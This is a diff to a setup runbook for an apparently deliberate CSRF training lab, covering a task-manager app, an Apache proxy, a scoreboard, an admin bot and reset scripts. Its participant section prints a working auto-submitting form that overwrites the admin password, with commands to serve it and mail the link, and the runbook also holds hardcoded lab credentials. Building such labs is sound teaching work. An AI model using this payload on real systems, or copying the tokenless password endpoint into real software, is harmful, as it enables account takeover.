@@ -66,7 +66,7 @@ pipe SQL into `sudo -S mysql` — the file redirect steals stdin from the passwo
 prompt. Cache sudo first, then redirect:
 ```bash
 echo <sudo-pass> | sudo -S -v
-sudo mysql < /home/john/csrfScenario/deploy/seed.sql
+sudo mysql < /home/john/csrfScenario/scripts/seed.sql
 # verify app user (password hardcoded in db.js):
 mysql -ujohn -p'johnPassword!@#$%' -e "SELECT COUNT(*) FROM userdb.users;"
 ```
@@ -76,9 +76,14 @@ Seeds users 1–5 (id=1 `john` admin) + a few tasks. Passwords match
 ## Phase 3 — Node backend + jsServer.service ✅
 ```bash
 sudo cp -r /home/john/csrfScenario/task-manager-backend /opt/task-manager-backend
-sudo cp /home/john/csrfScenario/deploy/backend.env /opt/task-manager-backend/.env
-sudo sed -i "s|^SESSION_SECRET=.*|SESSION_SECRET=$(head -c32 /dev/urandom|base64|tr -dc A-Za-z0-9)|" \
-     /opt/task-manager-backend/.env
+# .env — db.js hardcodes the DB password + 127.0.0.1; only these are read:
+sudo tee /opt/task-manager-backend/.env >/dev/null <<EOF
+PORT=3000
+DB_USER=john
+DB_NAME=userdb
+NODE_ENV=production
+SESSION_SECRET=$(head -c32 /dev/urandom | base64 | tr -dc A-Za-z0-9)
+EOF
 sudo chown -R john:john /opt/task-manager-backend
 cd /opt/task-manager-backend && npm install --no-audit --no-fund
 # db.js uses mysql.createPool (self-healing) — survives boot races, idle
@@ -96,7 +101,28 @@ session cookie (no token) overwrites the password and destroys the session.
 cd /home/john/csrfScenario/task-manager-frontend && npm install && npm run build
 sudo rm -rf /var/www/html/* && sudo cp -r dist/* /var/www/html/
 sudo a2enmod proxy proxy_http rewrite headers
-sudo cp /home/john/csrfScenario/deploy/apache-taskmanager.conf /etc/apache2/sites-available/taskmanager.conf
+# vhost: serve the SPA + reverse-proxy /api to the node backend
+sudo tee /etc/apache2/sites-available/taskmanager.conf >/dev/null <<'EOF'
+<VirtualHost *:80>
+    ServerName newtbug.local
+    DocumentRoot /var/www/html
+    ProxyPreserveHost On
+    ProxyPass        /api http://127.0.0.1:3000/api
+    ProxyPassReverse /api http://127.0.0.1:3000/api
+    <Directory /var/www/html>
+        Options -Indexes +FollowSymLinks
+        AllowOverride None
+        Require all granted
+        RewriteEngine On
+        RewriteCond %{REQUEST_URI} !^/api
+        RewriteCond %{REQUEST_FILENAME} !-f
+        RewriteCond %{REQUEST_FILENAME} !-d
+        RewriteRule ^ /index.html [L]
+    </Directory>
+    ErrorLog  ${APACHE_LOG_DIR}/taskmanager_error.log
+    CustomLog ${APACHE_LOG_DIR}/taskmanager_access.log combined
+</VirtualHost>
+EOF
 sudo a2dissite 000-default.conf && sudo a2ensite taskmanager.conf
 sudo systemctl restart apache2
 ```
@@ -106,11 +132,24 @@ to the node backend, login succeeds through the proxy.
 ## Phase 5 — Scoreboard (users.json) ✅
 ```bash
 sudo mkdir -p /var/www/html/assets
-sudo cp /home/john/csrfScenario/deploy/users.json /var/www/html/assets/users.json
+sudo tee /var/www/html/assets/users.json >/dev/null <<'EOF'
+{
+  "status": "ok",
+  "app": "Task-Manager",
+  "version": "1.0.2",
+  "users": [
+    { "EMP-ID": 101, "username": "John",    "email": "john@newtbug.com",    "role": "admin", "active": true },
+    { "EMP-ID": 102, "username": "Kevin",   "email": "kevin@newtbug.com",   "role": "user",  "active": false },
+    { "EMP-ID": 103, "username": "Olivia",  "email": "olivia@newtbug.com",  "role": "user",  "active": false },
+    { "EMP-ID": 104, "username": "Ray",     "email": "ray@newtbug.com",     "role": "user",  "active": false },
+    { "EMP-ID": 105, "username": "Camilla", "email": "camilla@newtbug.com", "role": "user",  "active": false }
+  ]
+}
+EOF
 sudo chown -R www-data:www-data /var/www/html
 ```
-`[{ "username":"john","role":"admin","active":true }]` — the bot flips the first
-`true`→`false` on a confirmed CSRF; the shutdown reset flips it back.
+The bot flips the first `true`→`false` on a confirmed CSRF (John's `active`); the
+reset (`reset-lab.sh` / shutdown reset) flips it back.
 
 ## Phase 6 — Chrome + chromedriver + Selenium bot 🚧
 ```bash
@@ -156,12 +195,23 @@ sudo python3 /home/john/csrfScenario/scripts/resetPasswords.py   # resets pw id 
 Repo lives at `/home/john/csrfScenario` so `reset.sh`'s script path resolves
 as-is, and the `/home/john/selenium_venv` symlink satisfies its venv `source`.
 **Note:** `reset.sh` stops Apache — it's a *shutdown* script, don't run it on a
-live lab. For a live re-arm use the manual reset in "Lab lifecycle" below.
+live lab. For a live re-arm use `reset-lab.sh` (below).
+
+**Consolidated boot reset (`reset-lab.sh` + `reset-lab.service`)** — one idempotent
+script that restores the whole baseline (reseed users/tasks, scoreboard
+`John:true`, clear Maildir, re-arm the bot). Install + enable at boot:
+```bash
+sudo cp /home/john/csrfScenario/scripts/reset-lab.sh /usr/local/bin/reset-lab.sh
+sudo chmod +x /usr/local/bin/reset-lab.sh
+sudo cp /home/john/csrfScenario/services/reset-lab.service /etc/systemd/system/
+sudo systemctl daemon-reload && sudo systemctl enable reset-lab.service
+```
+Run `sudo /usr/local/bin/reset-lab.sh` anytime to re-arm a live lab.
 
 ## Phase 9 — End-to-end verification ✅
 Verified the complete intended chain on the live deploy:
-1. PoC (`deploy/attacker/poc.html`, auto-submitting cross-site form) served from
-   `192.168.1.28:8000` (a different IP ⇒ genuinely cross-site).
+1. PoC (an auto-submitting cross-site form — see "Participant-facing attack")
+   served from a different IP ⇒ genuinely cross-site.
 2. Phishing mail sent attacker→victim over SMTP (`.28` → `.11:25`), landed in
    `/home/john/Maildir/new/…NewtBug`.
 3. Bot: `New mail detected` → `refreshing admin session` (fresh cookie) →
@@ -180,25 +230,35 @@ re-`active`, Maildir cleared).
 (`jsServer`, `apache2`, `postfix`, `mysql`, `seleniumAutomation`) are enabled and
 running; the bot re-logs in on boot and watches the Maildir.
 
-**Manual re-arm (after a solve, keeps services up):**
+**Manual re-arm (after a solve, keeps services up):** run the consolidated reset —
+it restores passwords + scoreboard, clears the Maildir, and restarts the bot:
 ```bash
-mysql -ujohn -p'johnPassword!@#$%' -e \
-  "UPDATE userdb.users SET password='Z8ctUXdmoIxsgG0wqMWU' WHERE id=1;"   # or run resetPasswords.py
-sudo cp /home/john/csrfScenario/deploy/users.json /var/www/html/assets/users.json
-sudo chown www-data:www-data /var/www/html/assets/users.json
-sudo rm -f /home/john/Maildir/new/* /home/john/Maildir/cur/*
-sudo systemctl restart seleniumAutomation.service   # bot exits on win; restart to re-arm
+sudo /usr/local/bin/reset-lab.sh
 ```
+(The boot `reset-lab.service` does the same automatically on every reboot.)
 
 **Win signal:** `/var/www/html/assets/users.json` `active` flips `true`→`false`,
 and the `seleniumAutomation` service exits (goes `inactive`).
 
 ## Participant-facing attack (what the solver does)
-1. Stand up an attacker page on a host with a **different IP** than the app that
-   auto-submits a cross-site POST to `http://192.168.1.11/api/change-password`
-   with a `newPassword` field (form-urlencoded — no token, no `oldPassword`).
-2. Email `john@newtbug.com` (SMTP to the victim:25) with a link to that page.
-3. The admin bot visits it; its session rides the request; password changes.
+From a host with a **different IP** than the victim (so the POST is cross-site),
+serve an auto-submitting form and email the admin bot a link to it:
+```html
+<!-- csrf.html — set VICTIM_IP -->
+<form id="c" action="http://VICTIM_IP/api/change-password" method="POST">
+  <input type="hidden" name="newPassword" value="pwned-by-csrf-123">
+</form>
+<script>document.getElementById("c").submit();</script>
+```
+```bash
+python3 -m http.server 8000        # on the attacker host (ATTACKER_IP)
+printf 'Subject: digest\n\nhttp://ATTACKER_IP:8000/csrf.html\n' | sendmail john@newtbug.com
+# or straight SMTP:  smtplib.SMTP("VICTIM_IP",25).send_message(msg)
+```
+The admin bot visits the link; its session cookie rides the cross-site POST
+(`SameSite=Lax` + the bot re-logs in per mail), so `/api/change-password` —
+which has no token and no `oldPassword` — overwrites the admin password.
+No SQLi: the query binds `newPassword` as a parameter.
 
 ## Troubleshooting
 - **All DB endpoints 500 ("Error registering user" / "Error logging in"); log says
@@ -209,11 +269,10 @@ and the `seleniumAutomation` service exits (goes `inactive`).
   lone `createConnection`) **and** `jsServer.service` ordering `After=/Requires=
   mysql.service`. If seen again, just `sudo systemctl restart jsServer`. Note the
   vuln surface is unchanged — the pool only affects connection management.
-- **IP changed:** the VM uses DHCP (was `192.168.1.11`, now `10.10.30.108`).
-  Nothing in the app hardcodes it (backend derives it, frontend uses relative
-  `/api`, bot derives it). Only external references need updating: the attacker
-  PoC's target URL (`deploy/attacker/poc.html`) and any docs. Re-discover with
-  `curl -s http://<ip>/assets/users.json` returning the scoreboard JSON.
+- **IP changed:** the VM uses DHCP. Nothing in the app hardcodes it (backend
+  derives it, frontend uses relative `/api`, bot derives it). Only external
+  references need updating: the attacker PoC's target URL and any docs.
+  Re-discover with `curl -s http://<ip>/assets/users.json`.
 - **Bot never reacts to mail:** confirm the Maildir filename contains `.NewtBug`
   (`ls /home/john/Maildir/new`). It derives from the hostname — must be `NewtBug`.
 - **CSRF 403 "no connect.sid":** the cookie aged past Chrome's 2-min window. The
